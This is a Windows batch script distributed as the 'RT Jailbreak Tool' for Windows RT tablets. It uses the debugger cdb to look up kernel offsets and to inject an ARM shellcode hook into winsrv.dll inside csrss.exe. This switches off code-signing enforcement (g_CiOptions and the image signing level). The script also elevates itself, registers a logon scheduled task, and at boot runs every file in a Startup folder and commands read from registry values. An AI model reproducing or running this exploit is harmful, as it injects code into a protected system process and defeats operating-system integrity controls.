@echo off
rem This is hereby released under a license where you can do whatever, on the terms that you do not claim the script or parts of the script as your own and retain 'Netham45' and 'clrokr' somewhere in the final product.
rem Released 03/01/2013, Version 1.20
rem Copyright Netham45
rem Thanks to clrokr for finding and documenting the exploit!
title RT Jailbreak Tool release 1.20 by Netham45

:top
rem Running as administrator mucks with the current dir, this restores it.
cd /d "%~dp0"
set command==-autorun

rem Check if we're flagged to run the startup commands
reg query HKCU\software\Jailbreak | find "runStartup" >nul 2>nul
if %ERRORLEVEL% == 0 goto Startup

rem Check if we have our binaries
if NOT EXIST bin\cdb.exe goto needBin
if NOT EXIST bin\isUnsigned.exe goto needBin

path=%PATH%;%cd%\bin

rem Check if we're already unsigned. If so, throw an error.
echo Performing some checks...
if NOT "%PROCESSOR_ARCHITECTURE%"=="ARM" goto notARM
cls

rem Check for commandline options
if "%1" == "-?" goto Help
if "%1" == "/?" goto Help
if "%1" == "-install" goto Install
if "%1" == "/install" goto Install
if "%1" == "-uninstall" goto Uninstall
if "%1" == "/uninstall" goto Uninstall
if "%1" == "-startup" goto Startup
if "%1" == "/startup" goto Startup

isUnsigned >NUL 2>NUL
if %ERRORLEVEL% ==  0 goto wereUnsigned
cls

if "%1" == "-autorun" goto Run

rem No commandline options. Give a prompt.
echo RT Jailbreak Tool release 1.20 by Netham45
echo [R]un Jailbreak
echo [I]nstall to run on boot
echo [U]ninstall to not run on boot
echo [E]xit
choice /C RIUE
if %ERRORLEVEL% == 2 goto Install
if %ERRORLEVEL% == 3 goto Uninstall
if %ERRORLEVEL% == 4 goto Exit

:run

rem Cheap dirty way to check if we're admin or not on a stock system
reg add HKLM\software\Jailbreak /v amIAdmin /f >nul 2>nul
if %ERRORLEVEL% == 1 goto notAdmin
reg delete HKLM\software\Jailbreak /v amIAdmin /f >nul 2>nul

rem Check if we BSoD'd last time, if so ask a question.
reg query HKCU\software\Jailbreak\ | find "cleanExit" | find "FALSE" >nul 2>nul
if %ERRORLEVEL% == 0 goto Blue
:returnFromBlue

rem Wait for the system to be up for two minutes.
echo Waiting for uptime to reach two minutes
%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "$Computer=(Get-WmiObject -Class Win32_OperatingSystem);$LastBoot=$Computer.ConvertToDateTime($Computer.LastBootUpTime);do{$sysuptime= (Get-Date)	-	$LastBoot}while($sysuptime.TotalSeconds -lt 120);$([char]7)"

rem Get signingleveling address
cd bin
echo Trying to get Sigining Level offset. If this part hangs please ensure that you  are connected to the internet. An internet connection is only required for the  first time the jailbreak is ran.
FOR /F "delims=( tokens=2" %%p IN ('cdb -z %systemroot%\system32\ntoskrnl.exe -c ".symfix;.reload;u ntoskrnl!SeGetImageRequiredSigningLevel+0x18;q" ^| findstr "ldr" ^| findstr "r3,="') DO set signinglevel=%%p
FOR /F "delims=) tokens=1" %%p IN ("%signinglevel%") DO set /a signinglevel=0x%%p + 0x16 - 0x400000
cd ..
rem Decimal to Hex script from https://gist.github.com/ijprest/1207832
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
set LOOKUP=0123456789abcdef &set HEXSTR=
set /a A=%signinglevel%
if !A! LSS 0 set /a A=0xfffffff + !A! + 1
:loop
set /a B=!A! %% 16 & set /a A=!A! / 16
set HEXSTR=!LOOKUP:~%B%,1!%HEXSTR%
if %A% GTR 0 goto :loop
rem End Decimal to Hex script

rem Add spaces, reverse endianness.
set signinglevel=%HEXSTR:~4,2% %HEXSTR:~2,2% %HEXSTR:~0,2% 00

rem Get ciOptions address
cd bin
cls
echo Trying to get g_CiOptions offset. If this part hangs please ensure that you are connected to the internet. An internet connection is only required for the first time the jailbreak is ran.
FOR /F "tokens=5" %%p IN ('cdb -z %systemroot%\system32\ci.dll -c ".symfix;.reload;? g_ciOptions;q" ^| findstr "Evaluate"') DO set /A ciOptions=0x%%p-0x10000+0x18
cd ..
rem Decimal to Hex script from https://gist.github.com/ijprest/1207832
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
set LOOKUP=0123456789abcdef &set HEXSTR=
set /a A=%ciOptions%
if !A! LSS 0 set /a A=0xfffffff + !A! + 1
:loop2
set /a B=!A! %% 16 & set /a A=!A! / 16
set HEXSTR=!LOOKUP:~%B%,1!%HEXSTR%
if %A% GTR 0 goto :loop2
rem End Decimal to Hex script

rem Add spaces, reverse endianness.
set ciOptions=%HEXSTR:~2,2% %HEXSTR:~0,2% 00 00


rem Get the current Session ID
for /F "tokens=4" %%b in ('tasklist /FI "IMAGENAME eq tasklist.exe" /FI "USERNAME eq %username%" /NH') do set SESSID=%%b
rem Get the pid for the CSRSS.exe process running under the current session
for /F "tokens=2" %%b in ('tasklist /FI "IMAGENAME eq csrss.exe" /FI "SESSION eq %SESSID%" /NH') do set PID=%%b

rem Create a registry value so we can check if the system BSoDs during the attempt. >nul 2>nul
reg add HKCU\software\Jailbreak\ /v cleanExit /d FALSE /f >nul 2>nul

rem Inject payload and hook
cdb -pvr -p %PID% -c "e winsrv.dll+0x3644 0d f0 dc b8;e winsrv.dll+0x10800 2D E9 FF 1F EB 46 84 B0 4F F4 00 53 03 93 4F F0 00 03 02 93 04 23 01 93 4F F4 80 53 00 93 03 AB 00 22 02 A9 4F F6 FF 70 CF F6 FF 70 4F F0 16 0C 01 DF 00 23 4F F4 00 52 02 99 0B 20 4F F0 34 0C 01 DF 02 99 C9 68 4E F6 F0 77 C0 F2 07 07 88 46 DF F8 64 90 C8 44 0C 23 1A AA 02 F1 04 05 C5 F8 00 80 09 21 6F F0 01 00 41 F2 E1 0C 01 DF 7F 1E 00 2F F0 D1 02 99 D1 F8 24 1B 40 F2 25 07 C0 F2 00 07 88 46 DF F8 34 90 C8 44 0C 23 1A AA 02 F1 04 05 C5 F8 00 80 09 21 6F F0 01 00 41 F2 E1 0C 01 DF 7F 1E 00 2F F0 D1 DD 46 BD E8 FF 1F 07 46 00 2F FD E7 F2 F7 CB BE %signinglevel% %ciOptions%;.detach;q" 1>nul 2>nul

cls
echo Please press VOLUME DOWN, VOLUME UP, or MUTE now

rem This loop goes until unsigned code is running
:stillSigned
isUnsigned 2>NUL
if NOT %ERRORLEVEL% == 0 goto stillSigned

rem Clear the hook and jump back to CSRSS's code
cdb -pvr -p %PID% -c "e winsrv.dll+0x3644 07 46 00 2f;e winsrv.dll+0xdetach;q" 1>nul 2>nul
rem Clean up.
reg delete HKCU\software\Jailbreak\ /v cleanExit /f >nul 2>nul

cls
echo Your tablet should now be jailbroken. Running Startup.
goto Startup
exit

:notAdmin
cls
rem This requests admin privs. Powershell is slow to load, I don't know why.
echo Please wait, requesting administrative privileges...
%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "Start-Process \"%~0\" \"%command%\" -Verb RunAs"
exit

:wereUnsigned
cls
echo The jailbreak has already been ran. Please choose an option:
echo [I]nstall the script to run on boot
echo [U]ninstall the script to not run on boot
echo [E]xit
choice /C IUE
if %ERRORLEVEL% == 1 goto Install
if %ERRORLEVEL% == 2 goto Uninstall
exit

:needBin
cls
echo I need my bin folder! Did you fully extract the zip?
pause
exit

:notARM
cls
echo This is not intended to run on %PROCESSOR_ARCHITECTURE%. Please run this on a Windows RT device.
pause
exit

:Blue
cls
reg delete HKCU\software\Jailbreak\ /v cleanExit /f >nul 2>nul
choice /m "The jailbreak crashed last time it ran. Would you like to continue?"
if %ERRORLEVEL% == 1 goto returnFromBlue
exit

:Install
cls
echo a > "%systemroot%\system32\rthack_temp"
if EXIST "%systemroot%\system32\rthack_temp" goto Install2
set command=-install
goto notAdmin

:Install2
del "%systemroot%\system32\rthack_temp"
echo Installing Task Scheduler event to run on boot
schtasks /create /sc ONLOGON /tn Jailbreak /tr "\"%~fp0\" -autorun" /F
%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "Set-ScheduledTask -TaskName Jailbreak -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)"
pause
exit

:Uninstall
cls
echo a > "%systemroot%\system32\rthack_temp"
if EXIST "%systemroot%\system32\rthack_temp" goto Uninstall2
set command=-uninstall
goto notAdmin

:Uninstall2
del "%systemroot%\system32\rthack_temp"
echo Removing Task Scheduler event to run on boot
schtasks /delete /tn Jailbreak /F
pause
exit

:Help
cls
echo -install     Add script to Task Scheduler so it runs on boot
echo -uninstall   Remove script from Task Scheduler so it no longer runs on boot
echo -autorun     Run without prompting
echo -startup	  Run startup commands
echo
echo See Readme.txt and the thread on XDA Developers for more information
pause
exit

:Startup
rem We don't want to run a bunch of programs that most likely don't need admin as admin. Let's make sure we don't.
reg add HKLM\software\Jailbreak /v amIAdmin /f >nul 2>nul
if %ERRORLEVEL% == 1 goto Startup2
reg delete HKLM\software\Jailbreak /v amIAdmin /f >nul 2>nul
reg add HKCU\software\Jailbreak /v runStartup /f >nul 2>nul
explorer "%~fp0"
exit

:Startup2
reg delete HKCU\software\Jailbreak /v runStartup /f >nul 2>nul
cd /d "%~dp0\Startup"
for /r %%a in (*) do %%a
for /F "tokens=3" %%b in ('reg query HKCU\Software\Jailbreak\RunOnBoot 2^>NUL') do %%b >nul 2>nul
for /F "tokens=3" %%b in ('reg query HKLM\Software\Jailbreak\RunOnBoot 2^>NUL') do %%b >nul 2>nul
pause
exit

:Exit
echo Not running jailbreak.
exit